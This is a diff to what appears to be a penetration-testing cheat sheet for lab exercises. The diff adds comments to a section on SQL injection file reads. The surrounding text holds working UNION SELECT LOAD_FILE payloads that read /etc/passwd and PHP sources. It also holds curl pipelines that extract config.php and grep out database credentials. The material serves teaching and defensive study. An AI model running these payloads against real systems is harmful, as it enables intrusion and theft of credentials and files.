@@ -28,8 +28,7 @@ SELECT LOAD_FILE('/path/to/file');
 cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
 cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
 ```
-
-> Only works if the MySQL OS user has read permission on the target file.
+> Reads a file from the server's filesystem and returns its contents. Only works if the MySQL process user has read permission on the target file.
 
 ---
 
@@ -46,6 +45,7 @@ cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
 cn' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- -
 -- Exposes DB credentials
 ```
+> Two-step source code read. First read the page you're injecting to find `include` or `require` calls. Then read those included files to find database credentials or other secrets. Replace the file paths with your target's webroot path.
 
 **Common target files:**
 
@@ -70,6 +70,7 @@ curl -s "http://TARGET_IP:TARGET_PORT/search.php?port_code=cn%27+UNION+SELECT+1,
   | python3 -c "import sys,html; print(html.unescape(sys.stdin.read()))" \
   | grep -E "(include|require)"
 ```
+> Reads the source of `search.php` via UNION injection. The Python one-liner decodes HTML entities so the PHP code is readable. `grep` filters for include/require lines to find what other files are loaded.
 
 Output: `include "config.php";`
 
@@ -80,6 +81,7 @@ curl -s "http://TARGET_IP:TARGET_PORT/search.php?port_code=cn%27+UNION+SELECT+1,
   | python3 -c "import sys,html; print(html.unescape(sys.stdin.read()))" \
   | grep "DB_"
 ```
+> Reads the included config file and filters for database credential lines. Replace `TARGET_IP`, `TARGET_PORT`, and the file paths with your target's values.
 
 **Result:**
 ```
